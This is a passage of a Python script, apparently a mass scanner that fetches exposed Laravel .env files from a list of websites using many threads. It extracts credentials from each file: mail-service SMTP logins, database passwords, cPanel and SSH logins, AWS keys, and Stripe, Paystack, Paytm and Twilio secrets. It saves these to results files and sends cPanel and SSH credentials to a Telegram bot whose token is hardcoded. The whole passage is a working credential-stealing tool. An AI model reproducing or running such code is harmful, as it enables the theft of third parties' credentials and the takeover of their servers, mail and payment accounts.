					open("results/sendinblue_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_FROM_ADDRESS={senmailadd}\n[+] MAIL_FROM_NAME={senmailname}\n[+] MAIL_USERNAME={senmailuser}\n[+] MAIL_PASSWORD={senmailpass}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found SENDINBLUE SMTP!")
				else:pass
				#mailjet
				jetmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				jetmailhost = ''.join(jetmailhost)
				jetmailuser = re.findall('\sMAIL_PORT=(.*?)\s', req)
				jetmailuser = ''.join(jetmailuser)
				jetmailport = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				jetmailport = ''.join(jetmailport)
				jetmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				jetmailpass = ''.join(jetmailpass)
				jetmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				jetmailenc = ''.join(jetmailenc)
				if '.mailjet.com' in req:
					open("results/mailjet_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={jetmailhost}\n[+] MAIL_PORT={jetmailuser}\n[+] MAIL_USERNAME={jetmailport}\n[+] MAIL_PASSWORD={jetmailpass}\n[+] MAIL_ENCRYPTION={jetmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found MAILJET SMTP!")
				else:pass
				#mailgun
				gunmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				gunmailhost = ''.join(gunmailhost)
				gunmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				gunmailport = ''.join(gunmailport)
				gunmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				gunmailuser = ''.join(gunmailuser)
				gunmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				gunmailpass = ''.join(gunmailpass)
				gunmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				gunmailenc = ''.join(gunmailenc)
				if 'smtp.mailgun.org' in req:
					open("results/mailgun_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={gunmailhost}\n[+] MAIL_PORT={gunmailport}\n[+] MAIL_USERNAME={gunmailuser}\n[+] MAIL_PASSWORD={gunmailpass}\n[+] MAIL_ENCRYPTION={gunmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found MAILGUN SMTP!")
				else:pass
				#EMAILSRVR
				srvmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				srvmailhost = ''.join(srvmailhost)
				srvmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				srvmailport = ''.join(srvmailport)
				srvmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				srvmailuser = ''.join(srvmailuser)
				srvmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				srvmailpass = ''.join(srvmailpass)
				srvmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				srvmailenc = ''.join(srvmailenc)
				if 'secure.emailsrvr.com' in req:
					open("results/rackspace_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={srvmailhost}\n[+] MAIL_PORT={srvmailport}\n[+] MAIL_USERNAME={srvmailuser}\n[+] MAIL_PASSWORD={srvmailpass}\n[+] MAIL_ENCRYPTION={srvmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found RACKSPACE!")
				else:pass
				#office
				omailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				omailhost = ''.join(omailhost)
				omailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				omailport = ''.join(omailport)
				omailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				omailuser = ''.join(omailuser)
				omailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				omailpass = ''.join(omailpass)
				omailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				omailenc = ''.join(omailenc)
				if 'smtp.office365.com' in req:
					open("results/office_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={omailhost}\n[+] MAIL_PORT={omailport}\n[+] MAIL_USERNAME={omailuser}\n[+] MAIL_PASSWORD={omailpass}\n[+] MAIL_ENCRYPTION={omailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found OFFICE SMTP!")
				else:pass
				#1and1
				onehost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				onehost = ''.join(onehost)
				oneport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				oneport = ''.join(oneport)
				oneuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				oneuser = ''.join(oneuser)
				onepass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				onepass = ''.join(onepass)
				if 'smtp.1and1' in req:
					open("results/1and1_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={onehost}\n[+] MAIL_PORT={oneport}\n[+] MAIL_USERNAME={oneuser}\n[+] MAIL_PASSWORD={onepass}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found 1AND1 SMTP!")
				else:pass
				#sendgrind
				smailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				smailhost = ''.join(smailhost)
				smailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				smailport = ''.join(smailport)
				smailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				smailuser = ''.join(smailuser)
				smailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				smailpass = ''.join(smailpass)
				smailfrom = re.findall('\sMAIL_FROM_NAME=(.*?)\s', req)
				smailfrom = ''.join(smailfrom)
				if 'smtp.sendgrid.net' in req:
					open("results/sendgrid_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={smailhost}\n[+] MAIL_PORT={smailport}\n[+] MAIL_USERNAME={smailuser}\n[+] MAIL_PASSWORD={smailpass}\n[+] MAIL_FROM_NAME={smailfrom}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found SENDGRID SMTP!")
				else:pass
				#mailtrap
				trapmailusesr = re.findall('\sMAIL_HOST=(.*?)\s', req)
				trapmailusesr = ''.join(trapmailusesr)
				trapmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				trapmailport = ''.join(trapmailport)
				trapmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				trapmailuser = ''.join(trapmailuser)
				trapmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				trapmailpass = ''.join(trapmailpass)
				trapmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				trapmailenc = ''.join(trapmailenc)
				if 'smtp.mailtrap.io' in req:
					open("results/mailtrap_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={trapmailusesr}\n[+] MAIL_PORT={trapmailport}\n[+] MAIL_USERNAME={trapmailuser}\n[+] MAIL_PASSWORD={trapmailpass}\n[+] MAIL_ENCRYPTION={trapmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found MAILTRAP SMTP!")
				else:pass
				#gmail
				gmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				gmailhost = ''.join(gmailhost)
				gmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				gmailport = ''.join(gmailport)
				gmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				gmailuser = ''.join(gmailuser)
				gmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				gmailpassw = ''.join(gmailpassw)
				gmailfadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', req)
				gmailfadd = ''.join(gmailfadd)
				gmailfname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', req)
				gmailfname = ''.join(gmailfname)
				if '.gmail.com' in req:
					open("results/gmail_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={gmailhost}\n[+] MAIL_PORT={gmailport}\n[+] MAIL_USERNAME={gmailuser}\n[+] MAIL_PASSWORD={gmailpassw}\n[+] MAIL_FROM_ADDRESS={gmailfadd}\n[+] MAIL_FROM_NAME={gmailfname}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found GMAIL SMTP!")
				else:pass
				#database
				dbhost = re.findall('\sDB_HOST=(.*?)\s', req)
				dbhost = ''.join(dbhost)
				dbport = re.findall('\sDB_PORT=(.*?)\s', req)
				dbport = ''.join(dbport)
				dbdata = re.findall('\sDB_DATABASE=(.*?)\s', req)
				dbdata = ''.join(dbdata)
				dbuser = re.findall('\sDB_USERNAME=(.*?)\s', req)
				dbuser = ''.join(dbuser)
				dbpassw = re.findall('\sDB_PASSWORD=(.*?)\s', req)
				dbpassw = ''.join(dbpassw)
				if 'DB_HOST' not in req:
					pass
				else:
					open("results/db_data.txt","a+").write(f"[+] HOST={domain}{path}\nDB_HOST={dbhost}\nDB_PORT={dbport}\nDB_DATABASE={dbdata}\nDB_USERNAME={dbuser}\nDB_PASSWORD={dbpassw}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found DB_DATA!")
				#cpannelcracked
				cpckuser = re.findall('\sDB_USERNAME=(.*?)\s', req)
				cpckuser = ''.join(cpckuser)
				cpckpass = re.findall('\sDB_PASSWORD=(.*?)\s', req)
				cpckpass = ''.join(cpckpass)
				if 'DB_PORT=3306' in req or 'DB_CONNECTION=mysql' in req:
					if len(cpckuser) == 0 or len(cpckpass) == 0:
						pass
					else:
						open("results/cpannel.txt","a+").write(f"http://{domain}:2083 {cpckuser}:{cpckpass}\n")
						print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found CPANNEL!")
					requests.get(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text=http://{domain}:2083 {cpckuser}:{cpckpass}\n|- FOUND CPANNEL!', headers=headersx, timeout=20)
				else:pass
				#cpannelcracked2
				cpckuser2 = re.findall('\sCPANEL_USERNAME=(.*?)\s', req)
				cpckuser2 = ''.join(cpckuser2)
				cpckpass2 = re.findall('\sCPANEL_PASSWORD=(.*?)\s', req)
				cpckpass2 = ''.join(cpckpass2)
				if len(cpckuser2) == 0 or len(cpckpass2) == 0:
					pass
				else:
					open("results/cpannel.txt","a+").write(f"http://{domain}:2083 {cpckuser2}:{cpckpass2}\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found CPANNEL!")
					requests.get(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text=http://{domain}:2083 {cpckuser2}:{cpckpass2}\n|- FOUND CPANNEL!', headers=headersx, timeout=20)
				#ssh
				sshckuser = re.findall('\sDB_USERNAME=(.*?)\s', req)
				sshckuser = ''.join(sshckuser)
				sshckpass = re.findall('\sDB_PASSWORD=(.*?)\s', req)
				sshckpass = ''.join(sshckpass)
				if 'DB_PORT=3306' in req or 'DB_HOST=127.0.0.1' in req or 'DB_CONNECTION=mysql' in req:
					if len(sshckuser) == 0 or len(sshckpass) == 0:
						pass
					else:
						open('results/ssh.txt', 'a+').write(f"ssh {sshckuser}@{ipdomen} -p 22:{sshckpass}:{domain}\n")
						print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found SSH!")
					requests.get(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text=ssh {sshckuser}@{ipdomen} -p 22:{sshckpass}:{domain}\n|- FOUND SSH!', headers=headersx, timeout=20)
				else:pass
				#amazon_smtp
				azmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				azmailhost = ''.join(azmailhost)
				azmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				azmailport = ''.join(azmailport)
				azmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				azmailuser = ''.join(azmailuser)
				azmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				azmailpass = ''.join(azmailpass)
				azmailadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', req)
				azmailadd = ''.join(azmailadd)
				azmailname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', req)
				azmailname = ''.join(azmailname)
				if '.amazonaws.com' not in req:
					pass
				else:
					if len(azmailuser) == 0 or len(azmailpass) == 0:
						pass
					else:
						open("results/amazon_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={azmailhost}\n[+] MAIL_PORT={azmailport}\n[+] MAIL_USERNAME={azmailuser}\n[+] MAIL_PASSWORD={azmailpass}\n[+] MAIL_FROM_ADDRESS={azmailadd}\n[+] MAIL_FROM_NAME={azmailname}\n=========================\n")
						print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found AMAZON AWS!")
    
				#DO_SPACE
				dsh = re.findall(r'\sDO_SPACES_KEY=(.*?)(?=\s|$)', req)
				dsh = ''.join(dsh)
				dssec = re.findall(r'\sDO_SPACES_SECRET=(.*?)(?=\s|$)', req)
				dssec = ''.join(dssec)
				dsendpo = re.findall(r'\sDO_SPACES_ENDPOINT=(.*?)(?=\s|$)', req)
				dsendpo = ''.join(dsendpo)
				if "DO_SPACES_KEY=" in req and "DO_SPACES_SECRET=" in req:	
					open("results/do_space.txt","a+").write(f"[+] HOST={domain}\n[+] DO_SPACES_KEY={dsh}\n[+] DO_SPACE_SECRET={dssec}\n[+] DO_SPACES_ENDPOINT={dsendpo}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found DO_SPACE!")
				else:pass
      
				#RT_PLAID
				rtpc = re.findall(r'\sRT_PLAID_CLIENT_ID=(.*?)(?=\s|$)', req)
				rtpc = ''.join(rtpc)
				rtsec = re.findall(r'\sRT_PLAID_SECRET=(.*?)(?=\s|$)', req)
				rtsec = ''.join(rtsec)
				rtenv = re.findall(r'\sRT_PLAID_ENV=(.*?)(?=\s|$)', req)
				rtenv = ''.join(rtenv)
				if "RT_PLAID_CLIENT_ID=" in req and "RT_PLAID_SECRET=" in req:	
					open("results/rt_plaid.txt","a+").write(f"[+] HOST={domain}\n[+] RT_PLAID_CLIENT_ID={rtpc}\n[+] RT_PLAID_SECRET={rtsec}\n[+] RT_PLAID_ENV={rtenv}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found RT_PLAID!")
				else:pass

				#PUSHER_APP
				paid = re.findall(r'\sPUSHER_APP_ID=(.*?)(?=\s|$)', req)
				paid = ''.join(paid)
				pakey = re.findall(r'\sPUSHER_APP_KEY=(.*?)(?=\s|$)', req)
				pakey = ''.join(pakey)
				pasec = re.findall(r'\sPUSHER_APP_SECRET=(.*?)(?=\s|$)', req)
				pasec = ''.join(pasec)
				paclu = re.findall(r'\sPUSHER_APP_CLUSTER=(.*?)(?=\s|$)', req)
				paclu = ''.join(paclu)
				mappkey = re.findall(r'\sMIX_PUSHER_APP_KEY=(.*?)(?=\s|$)', req)
				mappkey = ''.join(mappkey)
				mpaclu = re.findall(r'\sMIX_PUSHER_APP_CLUSTER=(.*?)(?=\s|$)', req)
				mpaclu = ''.join(mpaclu)
				if "PUSHER_APP_KEY=" in req and "USHER_APP_SECRET=" in req:	
					open("results/pusher.txt","a+").write(f"[+] HOST={domain}\n[+] PUSHER_APP_ID={paid}\n[+] PUSHER_APP_KEY={pakey}\n[+] PUSHER_APP_SECRET={pasec}\n[+] PUSHER_APP_CLUSTER={paclu}\n[+] MIX_PUSHER_APP_KEY={mappkey}\n[+] MIX_PUSHER_APP_CLUSTER={mpaclu}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found PUSHER!")
				else:pass
    
				#SSLCZ STORE
				sslid = re.findall(r'\sSSLCZ_STORE_ID=(.*?)(?=\s|$)', req)
				sslid = ''.join(sslid)
				sslpass = re.findall(r'\sSSLCZ_STORE_PASSWD=(.*?)(?=\s|$)', req)
				sslpass = ''.join(sslpass)
				if "SSLCZ_STORE_ID=" in req and "SSLCZ_STORE_PASSWD=" in req:	
					open("results/SSLCZ_STORE.txt","a+").write(f"[+] HOST={domain}\n[+] SSLCZ_STORE_ID={sslid}\n[+] SSLCZ_STORE_PASSWD={sslpass}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found SSLCZ!")
				else:pass

				#GET_PAYSTACK
				ppkey = re.findall(r'\sPAYSTACK_PUBLIC_KEY=(.*?)(?=\s|$)', req)
				ppkey = ''.join(ppkey)
				pskey = re.findall(r'\sPAYSTACK_SECRET_KEY=(.*?)(?=\s|$)', req)
				pskey = ''.join(pskey)
				pmmail = re.findall(r'\sPAYSTACK_MERCHANT_EMAIL=(.*?)(?=\s|$)', req)
				pmmail = ''.join(pmmail)
				ppurl = re.findall(r'\sPAYSTACK_PAYMENT_URL=(.*?)(?=\s|$)', req)
				ppurl = ''.join(ppurl)
				if "PAYSTACK_PUBLIC_KEY=" in req and "PAYSTACK_SECRET_KEY=" in req:	
					open("results/PAYSTACK.txt","a+").write(f"[+] HOST={domain}\n[+] PAYSTACK_PUBLIC_KEY={ppkey}\n[+] PAYSTACK_SECRET_KEY={pskey}\n[+] PAYSTACK_MERCHANT_EMAIL={pmmail}\n[+] PAYSTACK_PAYMENT_URL={ppurl}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found PAYSTACK!")
				else:pass

				#INSTAMOJO
				iakey = re.findall(r'\sINSTAMOJO_API_KEY=(.*?)(?=\s|$)', req)
				iakey = ''.join(iakey)
				iatoken = re.findall(r'\sINSTAMOJO_AUTH_TOKEN=(.*?)(?=\s|$)', req)
				iatoken = ''.join(iatoken)
				if "INSTAMOJO_API_KEY=" in req and "INSTAMOJO_AUTH_TOKEN=" in req:	
					open("results/INSTAMOJO.txt","a+").write(f"[+] HOST={domain}\n[+] INSTAMOJO_API_KEY={iakey}\n[+] INSTAMOJO_AUTH_TOKEN={iatoken}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found INSTAMOJO!")
				else:pass

				#PAYTM
				pymenv = re.findall(r'\sPAYTM_ENVIRONMENT=(.*?)(?=\s|$)', req)
				pymenv = ''.join(pymenv)
				pttmid = re.findall(r'\sPAYTM_MERCHANT_ID=(.*?)(?=\s|$)', req)
				pttmid = ''.join(pttmid)
				ptmkey = re.findall(r'\sPAYTM_MERCHANT_KEY=(.*?)(?=\s|$)', req)
				ptmkey = ''.join(ptmkey)
				ptmweb = re.findall(r'\sPAYTM_MERCHANT_WEBSITE=(.*?)(?=\s|$)', req)
				ptmweb = ''.join(ptmweb)
				ptmchl = re.findall(r'\sPAYTM_CHANNEL=(.*?)(?=\s|$)', req)
				ptmchl = ''.join(ptmchl)
				ptmtyp = re.findall(r'\sPAYTM_INDUSTRY_TYPE=(.*?)(?=\s|$)', req)
				ptmtyp = ''.join(ptmtyp)
				if "PAYTM_ENVIRONMENT=" in req and "PAYTM_MERCHANT_ID=" in req:	
					open("results/PAYTM.txt","a+").write(f"[+] HOST={domain}\n[+] PAYTM_ENVIRONMENT={pymenv}\n[+] PAYTM_MERCHANT_ID={pttmid}\n[+] PAYTM_MERCHANT_KEY={ptmkey}\n[+] PAYTM_MERCHANT_WEBSITE={ptmweb}\n[+] PAYTM_CHANNEL={ptmchl}\n[+] PAYTM_INDUSTRY_TYPE={ptmtyp}\n=========================\n")
					print(f"{blue}|- {white}htt,p://{domain}{path} {yellow}| {green}Found PAYTM!")
				else:pass
				
				#MAILCHIMP
				makey = re.findall(r'\sMAILCHIMP_API_KEY=(.*?)(?=\s|$)', req)
				makey = ''.join(makey)
				mlid = re.findall(r'\sMAILCHIMP_LIST_ID=(.*?)(?=\s|$)', req)
				mlid = ''.join(mlid)
				if "MAILCHIMP_API_KEY=" in req and "MAILCHIMP_API_KEY=" in req:	
					open("results/MAILCHIMP.txt","a+").write(f"[+] HOST={domain}\n[+] MAILCHIMP_API_KEY={makey}\n[+] MAILCHIMP_LIST_ID={mlid}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found MAILCHIMP!")
				else:pass

				#stripekey
				stkey = re.findall('\sSTRIPE_KEY=(.*?)\s', req)
				stkey = ''.join(stkey)
				stksc = re.findall('\sSTRIPE_SECRET=(.*?)\s', req)
				stksc = ''.join(stksc)
				if 'STRIPE_KEY' in req:
					open("results/aws_stripe.txt","a+").write(f"[+] HOST={domain}{path}\n[+] STRIPE_KEY={stkey}\n[+] STRIPE_SECRET={stksc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found AWS_STRIPE!")
				else:pass
				###
				awsnskey = re.findall('\sAWS_SNS_KEY=(.*?)\s', req)
				awsnskey = ''.join(awsnskey)
				awsnssec = re.findall('\sAWS_SNS_SECRET=(.*?)\s', req)
				awsnssec = ''.join(awsnssec)
				awsnsfrom = re.findall('\sSMS_FROM=(.*?)\s', req)
				awsnsfrom = ''.join(awsnsfrom)
				awsnsdriv = re.findall('\sSMS_DRIVER=(.*?)\s', req)
				awsnsdriv = ''.join(awsnsdriv)
				if 'AWS_SNS_KEY' in req:
					open("results/aws_sns.txt","a+").write(f"[+] HOST={domain}{path}\n[+] AWS_SNS_KEY={awsnskey}\n[+] AWS_SNS_SECRET={awsnssec}\\n[+] SMS_FROM={awsnsfrom}\n[+] SMS_DRIVER={awsnsdriv}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found AWS_SNS]")
				else:pass
				#####
				stkey3 = re.findall('\sAWS_S3_KEY=(.*?)\s', req)
				stkey3 = ''.join(stkey3)
				stksc3 = re.findall('\sAWS_S3_SECRET=(.*?)\s', req)
				stksc3 = ''.join(stksc3)
				if 'AWS_S3_KEY' in req:
					open("results/aws_s3.txt","a+").write(f"[+] HOST={domain}{path}\n[+] AWS_S3_KEY={stkey3}\n[+] AWS_S3_SECRET={stksc3}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found AWS_S3!")
				else:pass
				#####
				awsexkey = re.findall('\sEXOTEL_API_KEY=(.*?)\s', req)
				awsexkey = ''.join(awsexkey)
				awsextoken = re.findall('\sEXOTEL_API_TOKEN=(.*?)\s', req)
				awsextoken = ''.join(awsextoken)
				awsexsid = re.findall('\sEXOTEL_API_SID=(.*?)\s', req)
				awsexsid = ''.join(awsexsid)
				if 'EXOTEL_API_KEY' in req:
					open("results/aws_exotel.txt","a+").write(f"[+] HOST={domain}{path}\n[+] EXOTEL_API_KEY={awsexkey}\n[+] EXOTEL_API_TOKEN={awsextoken}\\n[+] EXOTEL_API_SID={awsexsid}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found EXOTEL]")
				else:pass
				#####
				smssendid = re.findall('\sSMS_API_SENDER_ID=(.*?)\s', req)
				smssendid = ''.join(smssendid)
				smssendtoken = re.findall('\sSMS_API_TOKEN=(.*?)\s', req)
				smssendtoken = ''.join(smssendtoken)
				smssendfrom = re.findall('\sSMS_API_FROM=(.*?)\s', req)
				smssendfrom = ''.join(smssendfrom)
				if 'SMS_API_SENDER_ID' in req:
					open("results/sms_sender.txt","a+").write(f"[+] HOST={domain}{path}\n[+] SMS_API_SENDER_ID={awsexkey}\n[+] SMS_API_TOKEN={awsextoken}\\n[+] SMS_API_FROM={awsexsid}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found SMS SENDER]")
				else:pass
				#####
				awsoneid = re.findall('\sONESIGNAL_APP_ID=(.*?)\s', req)
				awsoneid = ''.join(awsoneid)
				awsonekey = re.findall('\sONESIGNAL_REST_API_KEY=(.*?)\s', req)
				awsonekey = ''.join(awsonekey)
				awsoneakey = re.findall('\sONESIGNAL_USER_AUTH_KEY=(.*?)\s', req)
				awsoneakey = ''.join(awsoneakey)
				if 'ONESIGNAL_APP_ID' in req:
					open("results/aws_onesignal.txt","a+").write(f"[+] HOST={domain}{path}\n[+] ONESIGNAL_APP_ID={awsoneid}\n[+] ONESIGNAL_REST_API_KEY={awsonekey}\\n[+] ONESIGNAL_USER_AUTH_KEY={awsoneakey}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found ONESIGNAL]")
				else:pass
				#####
				tokboxdevkey = re.findall('\sTOKBOX_KEY_DEV=(.*?)\s', req)
				tokboxdevkey = ''.join(tokboxdevkey)
				tokboxdevsec = re.findall('\sTOKBOX_SECRET_DEV=(.*?)\s', req)
				tokboxdevsec = ''.join(tokboxdevsec)
				if 'TOKBOX_KEY_DEV' in req:
					open("results/aws_tokbox_dev.txt","a+").write(f"[+] HOST={domain}{path}\n[+] TOKBOX_KEY_DEV={tokboxdevkey}\n[+] TOKBOX_SECRET_DEV={tokboxdevsec}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found TOKBOX_DEV!")
				else:pass
				#####
				tokboxkey = re.findall('\sTOKBOX_KEY=(.*?)\s', req)
				tokboxkey = ''.join(tokboxkey)
				tokboxsec = re.findall('\sTOKBOX_SECRET=(.*?)\s', req)
				tokboxsec = ''.join(tokboxsec)
				if 'TOKBOX_KEY' in req:
					open("results/aws_tokbox.txt","a+").write(f"[+] HOST={domain}{path}\n[+] TOKBOX_KEY={tokboxkey}\n[+] TOKBOX_SECRET={tokboxsec}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found TOKBOX!")
				else:pass
				
				#aws_key
				awskeyid = re.findall('\sAWS_ACCESS_KEY_ID=(.*?)\s', req)
				awskeyid = ''.join(awskeyid)
				awskeysec = re.findall('\sAWS_SECRET_ACCESS_KEY=(.*?)\s', req)
				awskeysec = ''.join(awskeysec)
				awsregion = re.findall('\sAWS_DEFAULT_REGION=(.*?)\s', req)
				awsregion = ''.join(awsregion)
				awsbucket = re.findall('\sAWS_BUCKET=(.*?)\s', req)
				awsbucket = ''.join(awsbucket)
				if 'AWS_ACCESS_KEY_ID' not in req:
					pass
				else:
					open("results/aws_key.txt","a+").write(f"[+] HOST={domain}{path}\n[+] AWS_ACCESS_KEY_ID={awskeyid}\n[+] AWS_SECRET_ACCESS_KEY={awskeysec}\n[+] AWS_DEFAULT_REGION={awsregion}\n[+] AWS_BUCKET={awsbucket}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found AWS KEY!")
				#nexmo
				nkey = re.findall('\sNEXMO_KEY=(.*?)\s', req)
				nkey = ''.join(nkey)
				nsecret = re.findall('\sNEXMO_SECRET=(.*?)\s', req)
				nsecret = ''.join(nsecret)
				if 'NEXMO_KEY' not in req:
					pass
				else:
					open("results/nexmo.txt","a+").write(f"[+] HOST={domain}{path}\n[+] NEXMO_KEY={nkey}\n[+] NEXMO_SECRET={nsecret}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found NEXMO!")
				#plivo
				pid = re.findall('\sPLIVO_AUTH_ID=(.*?)\s', req)
				pid = ''.join(pid)
				ptoken = re.findall('\sPLIVO_TOKEN=(.*?)\s', req)
				ptoken = ''.join(ptoken)
				pnumr = re.findall('\sPLIVO_FROM_NUMBER=(.*?)\s', req)
				pnumr = ''.join(pnumr)
				if 'PLIVO_AUTH_ID' not in req:
					pass
				else:
					open("results/plivo.txt","a+").write(f"[+] HOST={domain}{path}\n[+] PLIVO_AUTH_ID={pid}\n[+] PLIVO_TOKEN={ptoken}\n[+] PLIVO_FROM_NUMBER={pnumr}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found PLIVO!")
				#twilio
				tsid = re.findall('TWILIO_ACCOUNT_SID="(.*?)"', req)
				tsid = ''.join(tsid)
				tapi_key = re.findall('TWILIO_API_KEY="(.*?)"', req)
				tapi_key = ''.join(tapi_key)
				tapi_secret = re.findall('TWILIO_API_SECRET="(.*?)"', req)
				tapi_secret = ''.join(tapi_secret)
				tchat = re.findall('TWILIO_CHAT_SERVICE_SID="(.*?)"', req)
				tchat = ''.join(tchat)
				tnumber = re.findall('TWILIO_NUMBER="(.*?)"', req)
				tnumber = ''.join(tnumber)
				ttoken = re.findall('TWILIO_AUTH_TOKEN="(.*?)"', req)
				ttoken = ''.join(ttoken)
				if 'TWILIO_API_KEY' not in req:
					pass
				else:
					open("results/twilio.txt","a+").write(f"[+] HOST={domain}{path}\n[+] TWILIO_ACCOUNT_SID={tsid}\n[+] TWILIO_API_KEY={tapi_key}\n[+] TWILIO_API_SECRET={tapi_secret}\n[+] TWILIO_CHAT_SERVICE_SID={tchat}\n[+] TWILIO_NUMBER={tnumber}\n[+] TWILIO_AUTH_TOKEN={ttoken}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found TWILIO!")
			else:print(f"{blue}|- {white}http://{domain}{path} {yellow}| {red}Not Vuln!")
	except Exception as e:print(e)

def scanAll(id_tele):
	domain = open(input(f"{red}[{white}#{red}]{white} LIST SITE : ")).readlines()
	thr = int(input(f"{red}[{white}#{red}]{white} THREADS (Max 50): "))
	ThreadPool = Pool(thr)
	ThreadPool.starmap(scanall, [(i, id_tele) for i in domain])
 
if __name__ == "__main__":
            time.sleep(1)
            clear()
            gui()
            id_tele = input(f"{red}[{white}#{red}]{white} Masukkan ID Telegram (opsional, tekan Enter jika tidak ada): ")
            scanAll(id_tele)
